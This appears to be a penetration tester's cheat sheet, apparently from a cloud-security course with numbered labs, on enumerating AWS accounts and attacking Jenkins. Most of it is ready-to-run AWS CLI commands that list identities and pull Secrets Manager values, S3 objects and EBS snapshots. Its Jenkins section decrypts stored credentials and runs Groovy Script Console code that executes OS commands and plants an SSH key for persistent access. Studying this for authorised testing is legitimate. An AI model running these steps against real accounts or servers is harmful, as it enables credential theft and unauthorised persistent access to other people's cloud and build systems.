# Enumeration 

## ✅ IAM Enumeration
```
aws iam list-users
aws iam list-groups 
aws iam list-instance-profiles 
```

```bash
aws iam get-user
aws iam list-roles
aws iam list-attached-user-policies --role-name <role>
aws iam list-attached-user-policies --user-name <user>
aws iam list-user-policies --user-name <user>
aws iam list-user-policies --role-name <role>
aws iam list-groups-for-user --user-name <user>
aws iam list-policy-versions --policy-arn <arn>
aws iam get-policy --policy-arn <arn>
aws iam get-policy-version --policy-arn <arn> --version-id v1
```

## ✅ S3 Enumeration
```bash
aws s3 ls 
aws s3 ls s3://<bucket> --no-sign-request
aws s3 cp s3://<bucket>/file .
aws s3 cp s3://<bucket>/<folder> . --recursive
```

## ✅ EBS Snapshots
```bash
aws ec2 describe-snapshots --owner-ids <account_id>
aws ec2 describe-snapshot-attribute --snapshot-id <id> --attribute createVolumePermission
aws ec2 create-volume --snapshot-id <id> --availability-zone us-east-1a
```

## ✅ Lambda Enumeration
```bash
aws lambda list-functions
aws lambda get-function --function-name <function_name>
```

## ✅ Secrets Enumeration
```
aws secretsmanager list-secrets
aws secretsmanager list-secrets --query 'SecretList[*].[Name, Description, ARN]' --output json 
aws secretsmanager get-secret-value --secret-id <SecretNameOrARN>
```

## ✅API Gateway Enumeration 
```
aws apigateway get-rest-apis
aws apigateway get-stages --rest-api-id <api-id>
aws apigateway get-rest-api --rest-api-id <api-id>
```
##  ✅SSM Check
```
aws ssm describe-instance-information --region <region>

```

## Jenkins 

```

- Check /script, /manage, /credentials
- 
## Credential Discovery
- Manage Jenkins → System → S3 Explorer
  - Look for plaintext AWS keys or bucket names
- Manage Jenkins → Credentials
  - Access key visible
  - Secret may be encrypted —> check HTML source code

## Decrypt Encrypted Secrets
// Manage Jenkins → Script Console
println(hudson.util.Secret.decrypt("{ENCRYPTED_STRING}"))

## RCE Groovy Script Console to SSH keys 
Manage Jenkins -> Script Console 

def proc = "id".execute()
def b = new StringBuffer()
proc.consumeProcessErrorStream(b)
println proc.text
println b.toString()

def proc = "mkdir .ssh".execute()
//other stuff must be included everytime 
def proc = "ssh-keygen -t rsa -b 4096 -N \"\" -f .ssh/id_rsa".execute()

def proc = "cp .ssh/id_rsa.pub .ssh/authorized_keys".execute()

def proc = "cat .ssh/id_rsa".execute()
```

## 🧩 Advanced Enumeration Tools

### 📌 aws-enumerator
- Automates brute force checks for permissions across many AWS services.
- Common commands:
  ```bash
  aws-enumerator cred --aws_access_key_id <key> --aws_secret_access_key <secret> --aws_region us-west-2
  aws-enumerator enum -services all
  aws-enumerator dump -services rds
  ```

- Example: Used in Session 2 to discover Lambda permissions and RDS access.

### 📌 awesomeuserfinder
```
git clone https://github.com/kapkek/AWeSomeUserFinder.git
cd AWeSomeUserFinder
python3 AWeSomeUserFinder.py -a <AccountID> -w <wordlist> 
```
### 📌 AWSEye
- Maps AWS account structure quickly: IAM, S3, Lambda, EC2, CloudFormation.
- Install and run:
  ```bash
  git clone https://github.com/sa7mon/AWSEye.git
  cd AWSEye
  pip install -r requirements.txt
  python3 awseye.py --access-key <key> --secret-key <secret> --region us-west-2
  ```

- Example: Use to visualize IAM roles and find over-permissive trust policies.

## ✅ Tools for OIDC Enumeration
- `github-oidc-checker`: Finds vulnerable OIDC trust for GitHub actions.
- Example:
  ```bash
  python3 aws-oidc-tester.py
  ```

## 🗂️ Example Labs
- Lab 6: `git-secrets` and `trufflehog` to find secrets in repos.
- Lab 8, Session 2: `aws-enumerator` to discover permissions.
- Session 2: `github-oidc-checker` to find OIDC trust misconfig.

